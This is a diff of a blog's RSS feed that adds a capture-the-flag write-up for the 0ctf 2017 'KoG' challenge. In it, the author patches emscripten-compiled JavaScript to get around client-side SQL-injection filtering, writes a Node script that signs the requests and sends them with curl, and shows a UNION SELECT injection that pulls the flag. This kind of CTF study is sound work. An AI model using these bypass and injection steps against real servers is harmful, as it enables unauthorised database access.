@@ -7,8 +7,99 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&amp;copy; &lt;a href=&#34;https://jiulongw.github.io&#34;&gt;jiulongw&lt;/a&gt; 2016</copyright>
-    <lastBuildDate>Sun, 26 Feb 2017 21:39:54 -0800</lastBuildDate>
+    <lastBuildDate>Sun, 19 Mar 2017 21:11:57 -0700</lastBuildDate>
     <atom:link href="https://jiulongw.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>0ctf 2017 - KoG</title>
+      <link>https://jiulongw.github.io/post/0ctf-2017-kog/</link>
+      <pubDate>Sun, 19 Mar 2017 21:11:57 -0700</pubDate>
+      
+      <guid>https://jiulongw.github.io/post/0ctf-2017-kog/</guid>
+      <description>&lt;p&gt;Do you know you can run your C++ program in browser?&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;problem&#34;&gt;Problem&lt;/h1&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;King of Glory is a funny game. Our website has a list of players.&lt;br /&gt;
+&lt;a href=&#34;http://202.120.7.213:11181&#34;&gt;http://202.120.7.213:11181&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Hitting the given URL doesn&amp;rsquo;t show anything interesting, but the page source code indicating it was looking for &lt;code&gt;id&lt;/code&gt;
+parameter.  So try it with &lt;code&gt;?id=1&lt;/code&gt;, we can see it made a request to api.php with some interesting parameters.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://202.120.7.213:11181/api.php?id=1&amp;amp;hash=035c6d4adf335c31e884796a11a2590f&amp;amp;time=1489983725
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ha, looks like it hashes &lt;code&gt;id&lt;/code&gt; using current time as salt and use that hash to validate at server side for integrity.
+If you try to put some SQLi stuff in &lt;code&gt;id&lt;/code&gt;, it will reject hash generation, which happens in client side.
+So the goal is pretty straightforward: bypass client side SQLi detection, generate hash and inject the server!&lt;/p&gt;
+
+&lt;p&gt;Now it comes the hard part: the &lt;a href=&#34;https://jiulongw.github.io/0ctf-2017/functionn.js&#34;&gt;hash generation code&lt;/a&gt; is the most complex Javascript code I have ever seen.  Tracing
+into &lt;code&gt;Module.main&lt;/code&gt;, I see memory allocators, function maps, and even function name that suggests system calls.
+What The Heck!&lt;/p&gt;
+
+&lt;p&gt;Googling around I figured it out: it was compiled from C/C++, using &lt;a href=&#34;http://kripken.github.io/emscripten-site&#34;&gt;emscripten&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Emscripten is an LLVM-based project that compiles C and C++ into highly-optimizable JavaScript in asm.js format.
+This lets you run C and C++ on the web at near-native speed, without plugins.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The bad news, there is little, if not none, tools to reverse engineer generated Javascript code.&lt;/p&gt;
+
+&lt;p&gt;The good news, it is still plain text, far better than ELF binary. It is easy to inject tracing code, run it with and
+without SQLi characters and compare the call sequence to find out where to apply patches.&lt;/p&gt;
+
+&lt;p&gt;The function in question was &lt;code&gt;__Z10user_inputNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE&lt;/code&gt;. After
+commenting out following two if blocks, it generates hash for any input.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;if (!($13)) {
+ ;HEAP32[$agg$result&amp;gt;&amp;gt;2]=HEAP32[$s&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+4&amp;gt;&amp;gt;2]=HEAP32[$s+4&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+8&amp;gt;&amp;gt;2]=HEAP32[$s+8&amp;gt;&amp;gt;2]|0;
+ ;HEAP32[$s&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+4&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+8&amp;gt;&amp;gt;2]=0|0;
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($te);
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($s);
+ STACKTOP = sp;return;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;if ((label|0) == 12) {
+ ;HEAP32[$agg$result&amp;gt;&amp;gt;2]=HEAP32[$s&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+4&amp;gt;&amp;gt;2]=HEAP32[$s+4&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+8&amp;gt;&amp;gt;2]=HEAP32[$s+8&amp;gt;&amp;gt;2]|0;
+ ;HEAP32[$s&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+4&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+8&amp;gt;&amp;gt;2]=0|0;
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($te);
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($s);
+ STACKTOP = sp;return;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now it becomes a simple SQLi task.  First use &lt;code&gt;order by&lt;/code&gt; trick to find out number of columns in the &lt;code&gt;select&lt;/code&gt; statement.
+Then query &lt;code&gt;information_schema.tables&lt;/code&gt; and &lt;code&gt;information_schema.columns&lt;/code&gt; to find table and column in question.&lt;/p&gt;
+
+&lt;p&gt;It is handy to write a simple &lt;code&gt;main.js&lt;/code&gt; that does the hash and curl so no need to copy-paste around.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var Module = require(&#39;./functionn.js&#39;);
+
+var q = process.argv[2];
+var hash = Module.main(q).split(&#39;|&#39;);
+
+var req = &#39;http://202.120.7.213:11181/api.php?id=&#39; + encodeURI(q) + &#39;&amp;amp;hash=&#39; + hash[0] + &#39;&amp;amp;time=&#39; + hash[1]
+console.log(req);
+
+var spawn = require(&#39;child_process&#39;).spawn;
+var curl = spawn(&#39;curl&#39;, [req]);
+
+curl.stdout.on(&#39;data&#39;, (data) =&amp;gt; {
+  console.log(`response: ${data}`);
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;$ node main.js &amp;quot;1 union all select 1,hey from fl4g&amp;quot;
+http://202.120.7.213:11181/api.php?id=1%20union%20all%20select%201,hey%20from%20fl4g&amp;amp;hash=c2f05acaf2f91ba81b8c9b3ce2304da7&amp;amp;time=1489882992
+response: EaseSingle Qinflag{emScripten_is_Cut3_right?}
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
     
     <item>
       <title>BKP 2017 - Accelerated.zone</title>
